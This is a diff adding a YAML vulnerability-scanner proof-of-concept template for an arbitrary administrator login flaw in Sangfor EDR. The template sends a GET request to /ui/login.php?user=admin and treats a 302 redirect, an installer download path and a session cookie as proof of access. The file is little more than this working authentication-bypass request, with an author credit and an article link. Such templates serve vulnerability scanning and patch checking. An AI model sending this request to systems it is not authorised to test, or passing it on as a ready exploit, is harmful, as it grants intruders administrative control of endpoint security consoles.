@@ -1,0 +1,13 @@
+name: poc-yaml-sangfor-edr-arbitrary-admin-login
+rules:
+  - method: GET
+    path: /ui/login.php?user=admin
+    follow_redirects: false
+    expression: >
+      response.status == 302 &&
+      response.body.bcontains(b"/download/edr_installer_") &&
+      response.headers["Set-Cookie"] != ""
+detail:
+  author: hilson
+  links:
+    - https://mp.weixin.qq.com/s/6aUrXcnab_EScoc0-6OKfA
